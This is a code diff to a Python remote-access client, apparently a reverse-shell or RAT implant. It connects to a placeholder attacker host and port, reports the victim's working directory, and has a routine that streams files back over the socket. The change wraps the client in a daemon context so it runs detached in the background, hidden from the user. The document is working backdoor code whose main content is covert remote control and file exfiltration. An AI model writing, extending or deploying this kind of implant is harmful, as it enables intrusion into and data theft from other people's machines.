@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import platform
+import daemon
 
 
 def send_file(filename):
@@ -12,6 +13,7 @@ def send_file(filename):
         return
     s.send(str(filesize).encode())
     if s.recv(BUFFER_SIZE).decode() == "ok":
+        # start sending the file
         with open(filename, "rb") as f:
             while True:
                 bytes_read = f.read(BUFFER_SIZE)
@@ -69,10 +71,11 @@ def run():
 
 
 if __name__ == '__main__':
-    SERVER_HOST = "$HOST$"
-    SERVER_PORT = "$PORT$"
-    BUFFER_SIZE = 10240
-    s = socket.socket()
-    s.connect((SERVER_HOST, SERVER_PORT))
-    s.send(os.getcwd().encode())
-    run()
+    with daemon.DaemonContext():
+        SERVER_HOST = "$HOST$"
+        SERVER_PORT = "$PORT$"
+        BUFFER_SIZE = 10240
+        s = socket.socket()
+        s.connect((SERVER_HOST, SERVER_PORT))
+        s.send(os.getcwd().encode())
+        run()
